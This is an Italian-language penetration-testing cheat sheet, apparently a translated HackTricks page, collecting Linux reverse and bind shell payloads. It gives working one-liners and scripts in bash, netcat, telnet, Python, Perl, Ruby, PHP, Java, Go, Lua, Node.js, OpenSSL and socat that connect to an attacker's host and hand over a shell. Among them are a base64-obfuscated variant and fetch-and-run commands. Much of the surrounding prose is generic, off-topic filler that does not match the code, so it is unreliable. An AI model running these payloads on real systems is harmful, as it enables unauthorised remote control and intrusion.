# Shells - Linux

<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **repository di github.**

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Trova le vulnerabilità che contano di più in modo da poterle correggere più velocemente. Intruder traccia la tua superficie di attacco, esegue scansioni proattive delle minacce, trova problemi in tutta la tua infrastruttura tecnologica, dalle API alle applicazioni web e ai sistemi cloud. [**Provalo gratuitamente**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) oggi.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

**Se hai domande su una di queste shell, puoi controllarle su** [**https://explainshell.com/**](https://explainshell.com)

## Full TTY

**Una volta ottenuta una reverse shell**[ **leggi questa pagina per ottenere un full TTY**](full-ttys.md)**.**

## Bash | sh
```bash
curl https://reverse-shell.sh/1.1.1.1:3000 | bash
bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1
bash -i >& /dev/udp/127.0.0.1/4242 0>&1 #UDP
0<&196;exec 196<>/dev/tcp/<ATTACKER-IP>/<PORT>; sh <&196 >&196 2>&196
exec 5<>/dev/tcp/<ATTACKER-IP>/<PORT>; while read line 0<&5; do $line 2>&5 >&5; done

#Short and bypass (credits to Dikline)
(sh)0>/dev/tcp/10.10.10.10/9091
#after getting the previous shell to get the output to execute
exec >&0
```
Non dimenticare di controllare con altre shell: sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh e bash.

### Shell sicura dei simboli
```bash
#If you need a more stable connection do:
bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1'

#Stealthier method
#B64 encode the shell like: echo "bash -c 'bash -i >& /dev/tcp/10.8.4.185/4444 0>&1'" | base64 -w0
echo bm9odXAgYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjQuMTg1LzQ0NDQgMD4mMScK | base64 -d | bash 2>/dev/null
```
#### Spiegazione dello Shell

1. **`bash -i`**: Questa parte del comando avvia una shell interattiva (`-i`) di Bash.
2. **`>&`**: Questa parte del comando è una notazione abbreviata per **ridirigere sia l'output standard** (`stdout`) **che l'errore standard** (`stderr`) verso la **stessa destinazione**.
3. **`/dev/tcp/<INDIRIZZO-IP-ATTACCANTE>/<PORTA>`**: Questo è un file speciale che **rappresenta una connessione TCP all'indirizzo IP e alla porta specificati**.
* **Ridirigendo i flussi di output e di errore su questo file**, il comando invia efficacemente l'output della sessione interattiva della shell alla macchina dell'attaccante.
4. **`0>&1`**: Questa parte del comando **ridirige l'input standard (`stdin`) verso la stessa destinazione dell'output standard (`stdout`)**.

### Creare un file ed eseguire il comando
```bash
echo -e '#!/bin/bash\nbash -i >& /dev/tcp/1<ATTACKER-IP>/<PORT> 0>&1' > /tmp/sh.sh; bash /tmp/sh.sh;
wget http://<IP attacker>/shell.sh -P /tmp; chmod +x /tmp/shell.sh; /tmp/shell.sh
```
## Shell inoltrata

Se incontri una **vulnerabilità RCE** all'interno di un'applicazione web basata su Linux, potrebbe esserci il caso in cui diventa difficile **ottenere una shell inversa** a causa della presenza di regole Iptables o di altri filtri. In tali scenari, considera la possibilità di creare una shell PTY all'interno del sistema compromesso utilizzando le pipe.

Puoi trovare il codice su [**https://github.com/IppSec/forward-shell**](https://github.com/IppSec/forward-shell)

Dovrai semplicemente modificare:

* L'URL dell'host vulnerabile
* Il prefisso e il suffisso del tuo payload (se presente)
* Il modo in cui il payload viene inviato (intestazioni? dati? informazioni extra?)

Successivamente, puoi semplicemente **inviare comandi** o addirittura **utilizzare il comando `upgrade`** per ottenere una PTY completa (nota che le pipe vengono lette e scritte con un ritardo approssimativo di 1,3 secondi).

## Netcat
```bash
nc -e /bin/sh <ATTACKER-IP> <PORT>
nc <ATTACKER-IP> <PORT> | /bin/sh #Blind
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER-IP> <PORT> >/tmp/f
nc <ATTACKER-IP> <PORT1>| /bin/bash | nc <ATTACKER-IP> <PORT2>
rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | nc <ATTACKER-IP> <PORT> 1>/tmp/bkpipe
```
## gsocket

Verificalo su [https://www.gsocket.io/deploy/](https://www.gsocket.io/deploy/)
```bash
bash -c "$(curl -fsSL gsocket.io/x)"
```
## Telnet

Telnet è un protocollo di rete che consente di stabilire una connessione remota con un dispositivo tramite la rete. È comunemente utilizzato per l'amministrazione remota di dispositivi di rete come router, switch e server.

Per utilizzare Telnet, è necessario avere un client Telnet installato sul proprio computer. Una volta stabilita la connessione Telnet con il dispositivo di destinazione, è possibile inviare comandi e ricevere risposte come se si fosse connessi direttamente al dispositivo.

Tuttavia, Telnet è un protocollo non sicuro in quanto i dati trasmessi non sono crittografati. Ciò significa che le informazioni sensibili, come le credenziali di accesso, potrebbero essere intercettate da un attaccante. Pertanto, è consigliabile utilizzare Telnet solo in ambienti di rete sicuri o utilizzare protocolli più sicuri come SSH.

Per connettersi a un dispositivo tramite Telnet, è necessario conoscere l'indirizzo IP del dispositivo e la porta Telnet su cui è in ascolto. Una volta connessi, è possibile utilizzare i comandi specifici del dispositivo per eseguire le operazioni desiderate.

Ecco un esempio di connessione Telnet a un dispositivo:

```
telnet 192.168.1.1 23
```

Dove "192.168.1.1" è l'indirizzo IP del dispositivo e "23" è la porta Telnet predefinita.

Una volta connessi, è possibile interagire con il dispositivo inviando comandi e ricevendo risposte. Ad esempio, è possibile visualizzare le informazioni di configurazione del dispositivo, eseguire comandi di diagnostica o effettuare modifiche alla configurazione.

Tuttavia, è importante tenere presente che Telnet non offre alcuna forma di autenticazione o crittografia dei dati. Pertanto, è consigliabile utilizzare Telnet solo in ambienti di rete sicuri o utilizzare protocolli più sicuri come SSH per proteggere le comunicazioni.
```bash
telnet <ATTACKER-IP> <PORT> | /bin/sh #Blind
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|telnet <ATTACKER-IP> <PORT> >/tmp/f
telnet <ATTACKER-IP> <PORT> | /bin/bash | telnet <ATTACKER-IP> <PORT>
rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | telnet <ATTACKER-IP> <PORT> 1>/tmp/bkpipe
```
L'attaccante utilizza il comando `whois` per ottenere informazioni sui domini, come il proprietario del dominio, i contatti tecnici e amministrativi, e i server dei nomi associati al dominio. Queste informazioni possono essere utili per identificare potenziali bersagli o per raccogliere informazioni di intelligence.
```bash
while true; do nc -l <port>; done
```
Per inviare il comando, scrivilo, premi Invio e premi CTRL+D (per interrompere STDIN)

**Vittima**
```bash
export X=Connected; while true; do X=`eval $(whois -h <IP> -p <Port> "Output: $X")`; sleep 1; done
```
## Python

Python è un linguaggio di programmazione ad alto livello, interpretato e orientato agli oggetti. È ampiamente utilizzato nel campo dell'hacking per la sua facilità di lettura e scrittura del codice. Python offre una vasta gamma di librerie e moduli che possono essere utilizzati per sviluppare strumenti e script di hacking.

### Shell inversa Python

Una shell inversa Python è uno script che consente a un hacker di ottenere un accesso remoto a un sistema compromesso. Questo script viene eseguito sul sistema compromesso e si connette a un server controllato dall'hacker, consentendo all'hacker di eseguire comandi sul sistema compromesso.

Ecco un esempio di uno script di shell inversa Python:

```python
import socket
import subprocess

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("indirizzo_ip", porta))
    
    while True:
        command = s.recv(1024).decode()
        
        if command.lower() == "exit":
            break
        
        output = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        result = output.stdout.read() + output.stderr.read()
        s.send(result)
    
    s.close()

connect()
```

Per utilizzare lo script, è necessario sostituire "indirizzo_ip" con l'indirizzo IP del server controllato dall'hacker e "porta" con la porta desiderata per la connessione.

### Esecuzione di comandi di sistema

Python offre la possibilità di eseguire comandi di sistema utilizzando la funzione `subprocess.Popen()`. Questa funzione consente di eseguire comandi come se fossero eseguiti direttamente dalla shell del sistema.

Ecco un esempio di come eseguire un comando di sistema utilizzando Python:

```python
import subprocess

command = "ls -la"
output = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
result = output.stdout.read() + output.stderr.read()

print(result)
```

Nell'esempio sopra, il comando "ls -la" viene eseguito e il risultato viene stampato a schermo.

### Manipolazione di file

Python offre una vasta gamma di funzioni per la manipolazione dei file. Queste funzioni consentono di leggere, scrivere, copiare, spostare e eliminare file.

Ecco alcuni esempi di come manipolare i file utilizzando Python:

#### Lettura di un file

```python
file = open("nome_file.txt", "r")
content = file.read()
file.close()

print(content)
```

#### Scrittura su un file

```python
file = open("nome_file.txt", "w")
file.write("Contenuto del file")
file.close()
```

#### Copia di un file

```python
import shutil

shutil.copy("file_originale.txt", "file_copia.txt")
```

#### Spostamento di un file

```python
import shutil

shutil.move("file_originale.txt", "nuova_posizione/file_originale.txt")
```

#### Eliminazione di un file

```python
import os

os.remove("nome_file.txt")
```

### Conclusioni

Python è uno strumento potente per gli hacker, grazie alla sua flessibilità e alle numerose librerie disponibili. Con Python, è possibile sviluppare script personalizzati per eseguire una vasta gamma di attività di hacking, come l'accesso remoto a sistemi compromessi, l'esecuzione di comandi di sistema e la manipolazione dei file.
```bash
#Linux
export RHOST="127.0.0.1";export RPORT=12345;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
#IPv6
python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::125c",4343,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn("/bin/sh");'
```
## Perl

Perl è un linguaggio di programmazione ad alto livello e interpretato, ampiamente utilizzato per l'automazione di compiti di sistema e lo sviluppo di script. È particolarmente utile per la manipolazione di stringhe e l'elaborazione di testo. Perl offre una vasta gamma di funzionalità e librerie che lo rendono uno strumento potente per gli hacker.

### Esecuzione di comandi di sistema

Perl consente di eseguire comandi di sistema direttamente dal codice. Questo può essere utile per eseguire comandi di shell o interagire con il sistema operativo. Ecco un esempio di come eseguire un comando di sistema in Perl:

```perl
system("comando");
```

### Manipolazione di stringhe

Perl offre una vasta gamma di funzioni per la manipolazione di stringhe. Questo può essere utile per analizzare e manipolare dati sensibili. Ecco alcuni esempi di funzioni di manipolazione delle stringhe in Perl:

- `length($stringa)`: restituisce la lunghezza della stringa.
- `substr($stringa, $inizio, $lunghezza)`: restituisce una sottostringa della stringa.
- `index($stringa, $sottostringa)`: restituisce la posizione della sottostringa nella stringa.
- `split($delimitatore, $stringa)`: divide la stringa in un array di sottostringhe in base al delimitatore specificato.

### Elaborazione di file

Perl offre potenti funzionalità per l'elaborazione di file. Questo può essere utile per analizzare file di log, estrarre informazioni o modificare il contenuto dei file. Ecco alcuni esempi di funzioni di elaborazione dei file in Perl:

- `open($filehandle, $nomefile)`: apre un file per la lettura o la scrittura.
- `close($filehandle)`: chiude un file aperto.
- `read($filehandle, $variabile, $lunghezza)`: legge una determinata quantità di dati dal file.
- `write($filehandle, $dati, $lunghezza)`: scrive una determinata quantità di dati nel file.

### RegEx

Perl supporta le espressioni regolari (RegEx), che consentono di cercare e manipolare testo in modo flessibile. Questo può essere utile per trovare pattern specifici o filtrare dati. Ecco alcuni esempi di utilizzo delle espressioni regolari in Perl:

- `m/pattern/`: cerca un pattern nella stringa.
- `s/pattern/sostituzione/`: sostituisce un pattern con una determinata stringa.
- `g`: esegue la ricerca o la sostituzione in modo globale (su tutte le occorrenze).

### Moduli CPAN

Perl ha una vasta collezione di moduli disponibili nel Comprehensive Perl Archive Network (CPAN). Questi moduli offrono funzionalità aggiuntive che possono essere utili per gli hacker. È possibile installare i moduli CPAN utilizzando il comando `cpan` o `cpanm`. Ecco alcuni esempi di moduli CPAN popolari:

- `Net::Pcap`: fornisce funzionalità per la cattura e l'analisi del traffico di rete.
- `Crypt::OpenSSL::RSA`: offre funzionalità per la crittografia RSA.
- `IO::Socket::SSL`: fornisce funzionalità per la comunicazione sicura tramite socket.

Questi sono solo alcuni esempi delle potenti funzionalità di Perl per gli hacker. Conoscere e padroneggiare Perl può essere un vantaggio significativo per eseguire attività di hacking e automazione di compiti di sistema.
```bash
perl -e 'use Socket;$i="<ATTACKER-IP>";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"[IPADDR]:[PORT]");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```
## Ruby

Ruby è un linguaggio di programmazione dinamico, orientato agli oggetti e adatto per lo sviluppo di applicazioni web. È molto popolare tra gli sviluppatori per la sua sintassi semplice e leggibile.

### Esecuzione di comandi di sistema

Per eseguire comandi di sistema in Ruby, è possibile utilizzare il metodo `system` o il backtick (`).

```ruby
# Utilizzo del metodo system
system("ls -la")

# Utilizzo del backtick
output = `ls -la`
puts output
```

Entrambi i metodi restituiscono l'output del comando eseguito. Tuttavia, il backtick restituisce l'output come una stringa, mentre il metodo `system` restituisce un valore booleano che indica se il comando è stato eseguito correttamente.

### Creazione di un reverse shell

Per creare un reverse shell in Ruby, è possibile utilizzare la libreria `socket`. Di seguito è riportato un esempio di codice per creare un reverse shell che si connette a un indirizzo IP e una porta specifici:

```ruby
require 'socket'

ip = '192.168.1.100'
port = 4444

socket = TCPSocket.new(ip, port)
socket.puts "Connected to reverse shell!"

while line = socket.gets
  output = `#{line}`
  socket.puts output
end

socket.close
```

Questo codice crea una connessione TCP con l'indirizzo IP e la porta specificati. Successivamente, invia una stringa di conferma al server. Quindi, entra in un ciclo che legge i comandi inviati dal server, esegue il comando utilizzando il backtick e invia l'output al server.

### Esecuzione di codice Ruby da una shell interattiva

Per eseguire codice Ruby da una shell interattiva, è possibile utilizzare il comando `irb` (Interactive Ruby). Basta digitare `irb` nel terminale e si aprirà una shell interattiva in cui è possibile inserire ed eseguire codice Ruby.

```ruby
$ irb
irb(main):001:0> puts "Hello, world!"
Hello, world!
=> nil
```

In questo esempio, viene utilizzato `irb` per stampare "Hello, world!" a schermo. L'output `=> nil` indica che l'espressione ha restituito `nil`.

### Conclusioni

Ruby è un linguaggio di programmazione versatile che può essere utilizzato per eseguire comandi di sistema, creare reverse shell e eseguire codice Ruby da una shell interattiva. Conoscere queste tecniche può essere utile per gli hacker che desiderano sfruttare le vulnerabilità dei sistemi e ottenere accesso non autorizzato.
```bash
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```
## PHP

PHP è un linguaggio di scripting ampiamente utilizzato per lo sviluppo di applicazioni web dinamiche. È possibile utilizzare PHP per creare script che vengono eseguiti lato server e generano contenuti dinamici per i siti web.

### Esecuzione di comandi di sistema

In PHP, è possibile eseguire comandi di sistema utilizzando la funzione `exec()`. Questa funzione consente di eseguire comandi come se fossero eseguiti da una shell di sistema. Ad esempio, è possibile eseguire il comando `ls` per elencare i file in una directory specifica:

```php
<?php
$output = exec('ls /path/to/directory');
echo $output;
?>
```

### Inclusione di file esterni

PHP consente di includere file esterni all'interno di uno script utilizzando le istruzioni `include` o `require`. Questo può essere utile per riutilizzare il codice o per includere librerie esterne. Ad esempio, è possibile includere un file di configurazione contenente le credenziali di accesso al database:

```php
<?php
include 'config.php';
// Utilizzare le credenziali di accesso al database
?>
```

### Manipolazione delle stringhe

PHP offre una vasta gamma di funzioni per la manipolazione delle stringhe. È possibile concatenare stringhe, estrarre sottostringhe, sostituire parti di una stringa e molto altro ancora. Ad esempio, è possibile utilizzare la funzione `substr()` per estrarre una sottostringa da una stringa:

```php
<?php
$string = "Hello, world!";
$substring = substr($string, 0, 5);
echo $substring; // Output: Hello
?>
```

### Connessione al database

PHP supporta la connessione a diversi tipi di database, come MySQL, PostgreSQL e SQLite. È possibile utilizzare le estensioni appropriate per connettersi al database desiderato e interagire con esso. Ad esempio, è possibile utilizzare l'estensione MySQLi per connettersi a un database MySQL:

```php
<?php
$servername = "localhost";
$username = "root";
$password = "password";
$dbname = "database";

$conn = new mysqli($servername, $username, $password, $dbname);
if ($conn->connect_error) {
    die("Connessione fallita: " . $conn->connect_error);
}

// Eseguire query sul database

$conn->close();
?>
```

### Gestione delle sessioni

PHP offre funzionalità integrate per la gestione delle sessioni. È possibile utilizzare le funzioni `session_start()` e `$_SESSION` per avviare una sessione e memorizzare dati specifici della sessione. Ad esempio, è possibile memorizzare il nome utente dell'utente loggato nella sessione:

```php
<?php
session_start();
$_SESSION['username'] = 'john_doe';
?>
```

### Manipolazione dei file

PHP offre funzioni per la manipolazione dei file, come la lettura, la scrittura e l'eliminazione di file. È possibile utilizzare queste funzioni per gestire i file sul server. Ad esempio, è possibile utilizzare la funzione `file_get_contents()` per leggere il contenuto di un file:

```php
<?php
$file = 'example.txt';
$content = file_get_contents($file);
echo $content;
?>
```

Questi sono solo alcuni esempi delle funzionalità offerte da PHP. Il linguaggio offre molte altre funzioni e librerie che possono essere utilizzate per sviluppare applicazioni web dinamiche e potenti.
```php
// Using 'exec' is the most common method, but assumes that the file descriptor will be 3.
// Using this method may lead to instances where the connection reaches out to the listener and then closes.
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'

// Using 'proc_open' makes no assumptions about what the file descriptor will be.
// See https://security.stackexchange.com/a/198944 for more information
<?php $sock=fsockopen("10.0.0.1",1234);$proc=proc_open("/bin/sh -i",array(0=>$sock, 1=>$sock, 2=>$sock), $pipes); ?>

<?php exec("/bin/bash -c 'bash -i >/dev/tcp/10.10.14.8/4444 0>&1'"); ?>
```
## Java

Java è un linguaggio di programmazione ad alto livello, orientato agli oggetti e multi-piattaforma. È ampiamente utilizzato per lo sviluppo di applicazioni web, desktop e mobili. Java è noto per la sua portabilità, sicurezza e robustezza.

### Caratteristiche principali di Java:

- **Orientato agli oggetti**: Java supporta la programmazione orientata agli oggetti, consentendo agli sviluppatori di creare classi e oggetti per organizzare il codice in modo modulare e riutilizzabile.

- **Portabilità**: Le applicazioni Java possono essere eseguite su diverse piattaforme senza dover essere riscritte. Ciò è possibile grazie alla Java Virtual Machine (JVM), che interpreta il codice Java in un formato comprensibile per il sistema operativo sottostante.

- **Sicurezza**: Java è progettato per essere sicuro, con funzionalità come la gestione della memoria automatica e la sandbox di sicurezza che limita l'accesso alle risorse del sistema.

- **Robustezza**: Java è noto per la sua robustezza, grazie alla gestione degli errori e all'eccezionale gestione delle eccezioni. Ciò consente agli sviluppatori di scrivere codice affidabile e resistente agli errori.

- **Ampia libreria standard**: Java offre una vasta gamma di librerie standard che semplificano lo sviluppo di applicazioni. Queste librerie forniscono funzionalità per la gestione delle stringhe, l'input/output, la grafica, la sicurezza e molto altro.

### Utilizzo di Java:

Java viene utilizzato in diversi contesti, tra cui:

- **Sviluppo di applicazioni web**: Java è ampiamente utilizzato per lo sviluppo di applicazioni web, grazie a framework come Spring e JavaServer Faces (JSF).

- **Sviluppo di applicazioni desktop**: Java offre la possibilità di creare applicazioni desktop cross-platform utilizzando librerie come Swing e JavaFX.

- **Sviluppo di applicazioni mobili**: Java è utilizzato per lo sviluppo di applicazioni mobili Android, utilizzando il framework Android SDK.

- **Sviluppo di applicazioni enterprise**: Java è spesso utilizzato per lo sviluppo di applicazioni aziendali complesse, grazie alla sua scalabilità e alle sue funzionalità di gestione delle transazioni.

### Esempio di codice Java:

```java
public class HelloWorld {
    public static void main(String[] args) {
        System.out.println("Ciao, mondo!");
    }
}
```

Questo è un semplice esempio di codice Java che stampa "Ciao, mondo!" sulla console.
```bash
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/ATTACKING-IP/80;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```
## Ncat

Ncat è un'utilità di rete che consente di creare connessioni TCP e UDP, inviare e ricevere dati su queste connessioni e ascoltare porte per connessioni in arrivo. È un'alternativa più potente al comando `netcat` e offre molte funzionalità avanzate.

### Installazione

Ncat è incluso nel pacchetto `nmap`, quindi per installarlo è sufficiente eseguire il seguente comando:

```bash
sudo apt-get install nmap
```

### Utilizzo di base

Per creare una connessione TCP verso un host e una porta specifici, utilizzare il seguente comando:

```bash
ncat <host> <port>
```

Per inviare dati attraverso la connessione, digitare il testo desiderato e premere Invio. Per terminare la connessione, premere `Ctrl + C`.

Per ascoltare su una porta specifica per connessioni in arrivo, utilizzare il seguente comando:

```bash
ncat -l <port>
```

### Funzionalità avanzate

Ncat offre molte funzionalità avanzate, tra cui:

- Criptazione delle connessioni utilizzando SSL/TLS.
- Trasferimento di file attraverso la connessione utilizzando il protocollo FTP.
- Creazione di tunnel crittografati per bypassare i firewall.
- Scansione delle porte di un host remoto.
- Esecuzione di comandi remoti su un host tramite la connessione.

Per ulteriori informazioni sulle funzionalità avanzate di Ncat, consultare la documentazione ufficiale.
```bash
victim> ncat --exec cmd.exe --allow 10.0.0.4 -vnl 4444 --ssl
attacker> ncat -v 10.0.0.22 4444 --ssl
```
<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Trova le vulnerabilità che contano di più in modo da poterle correggere più velocemente. Intruder traccia la tua superficie di attacco, esegue scansioni proattive delle minacce, trova problemi in tutta la tua infrastruttura tecnologica, dalle API alle applicazioni web e ai sistemi cloud. [**Provalo gratuitamente**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) oggi stesso.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## Golang
```bash
echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","192.168.0.134:8080");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
```
## Lua

Lua è un linguaggio di scripting leggero e potente che può essere utilizzato per estendere le funzionalità di un'applicazione o per creare script autonomi. È spesso utilizzato come linguaggio di scripting incorporato in applicazioni come giochi, editor di testo e software di automazione.

Lua offre una sintassi semplice e pulita, che lo rende facile da imparare e da utilizzare. Supporta anche la programmazione orientata agli oggetti e dispone di una vasta libreria standard che fornisce funzionalità per la gestione dei file, la manipolazione delle stringhe, la gestione delle date e molto altro.

Per eseguire uno script Lua, è necessario avere un interprete Lua installato sul sistema. Una volta installato, è possibile eseguire lo script da riga di comando utilizzando il comando `lua` seguito dal nome del file di script.

Lua offre anche la possibilità di interagire con il sistema operativo ospite, consentendo di eseguire comandi di shell, accedere ai file di sistema e comunicare con altri processi. Questa funzionalità può essere utilizzata per automatizzare compiti di sistema o per eseguire operazioni avanzate durante l'esecuzione di uno script Lua.

Inoltre, Lua supporta l'uso di librerie esterne, che consentono di estendere ulteriormente le funzionalità del linguaggio. Queste librerie possono essere scritte in C o in altri linguaggi di programmazione e possono essere utilizzate per aggiungere funzionalità personalizzate a uno script Lua.

In conclusione, Lua è un linguaggio di scripting potente e flessibile che offre molte funzionalità utili per estendere le capacità di un'applicazione o per creare script autonomi. La sua sintassi semplice e pulita lo rende facile da imparare e da utilizzare, mentre la sua vasta libreria standard e la possibilità di utilizzare librerie esterne offrono molte opzioni per personalizzare e migliorare i propri script Lua.
```bash
#Linux
lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','1234');os.execute('/bin/sh -i <&3 >&3 2>&3');"
#Windows & Linux
lua5.1 -e 'local host, port = "127.0.0.1", 4444 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, 'r') local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
```
## NodeJS

Node.js è un ambiente di runtime JavaScript basato sul motore JavaScript V8 di Google Chrome. È ampiamente utilizzato per lo sviluppo di applicazioni server-side e per la creazione di strumenti di linea di comando.

### Installazione di Node.js

Per installare Node.js, è possibile seguire i seguenti passaggi:

1. Aprire il terminale.
2. Eseguire il comando `curl -sL https://deb.nodesource.com/setup_14.x | sudo -E bash -` per scaricare lo script di installazione.
3. Eseguire il comando `sudo apt-get install -y nodejs` per installare Node.js.

### Creazione di un'applicazione Node.js

Per creare un'applicazione Node.js, è possibile seguire i seguenti passaggi:

1. Aprire il terminale.
2. Navigare nella directory in cui si desidera creare l'applicazione.
3. Eseguire il comando `npm init` per inizializzare un nuovo progetto Node.js.
4. Seguire le istruzioni per configurare il progetto.
5. Eseguire il comando `npm install` per installare le dipendenze del progetto.
6. Creare il file `index.js` e iniziare a scrivere il codice dell'applicazione.

### Esecuzione di un'applicazione Node.js

Per eseguire un'applicazione Node.js, è possibile seguire i seguenti passaggi:

1. Aprire il terminale.
2. Navigare nella directory dell'applicazione.
3. Eseguire il comando `node index.js` per avviare l'applicazione.

### Gestione delle dipendenze con npm

npm è il gestore di pacchetti predefinito per Node.js. Per installare una dipendenza, è possibile eseguire il comando `npm install <nome_dipendenza>`. Per rimuovere una dipendenza, è possibile eseguire il comando `npm uninstall <nome_dipendenza>`.
```javascript
(function(){
var net = require("net"),
cp = require("child_process"),
sh = cp.spawn("/bin/sh", []);
var client = new net.Socket();
client.connect(8080, "10.17.26.64", function(){
client.pipe(sh.stdin);
sh.stdout.pipe(client);
sh.stderr.pipe(client);
});
return /a/; // Prevents the Node.js application form crashing
})();


or

require('child_process').exec('nc -e /bin/sh [IPADDR] [PORT]')
require('child_process').exec("bash -c 'bash -i >& /dev/tcp/10.10.14.2/6767 0>&1'")

or

-var x = global.process.mainModule.require
-x('child_process').exec('nc [IPADDR] [PORT] -e /bin/bash')

or

// If you get to the constructor of a function you can define and execute another function inside a string
"".sub.constructor("console.log(global.process.mainModule.constructor._load(\"child_process\").execSync(\"id\").toString())")()
"".__proto__.constructor.constructor("console.log(global.process.mainModule.constructor._load(\"child_process\").execSync(\"id\").toString())")()


or

// Abuse this syntax to get a reverse shell
var fs = this.process.binding('fs');
var fs = process.binding('fs');

or

https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py
```
## OpenSSL

L'Attaccante (Kali)
```bash
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes #Generate certificate
openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port> #Here you will be able to introduce the commands
openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port2> #Here yo will be able to get the response
```
La Vittima
```bash
#Linux
openssl s_client -quiet -connect <ATTACKER_IP>:<PORT1>|/bin/bash|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>

#Windows
openssl.exe s_client -quiet -connect <ATTACKER_IP>:<PORT1>|cmd.exe|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>
```
## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

### Shell di bind

Il shell di bind è una tecnica di hacking che consente a un attaccante di creare una connessione di rete tra il suo computer e la macchina bersaglio. Questo può essere fatto utilizzando il programma Socat, che è disponibile per il download su [https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries).
```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP:<victim_ip>:1337
```
### Shell inversa

Una shell inversa è una tecnica utilizzata dai hacker per ottenere l'accesso a un sistema remoto. Invece di connettersi direttamente al sistema di destinazione, l'hacker fa in modo che il sistema di destinazione si connetta a lui. Questo permette all'hacker di ottenere un accesso remoto al sistema di destinazione e di eseguire comandi come se fosse connesso direttamente ad esso.

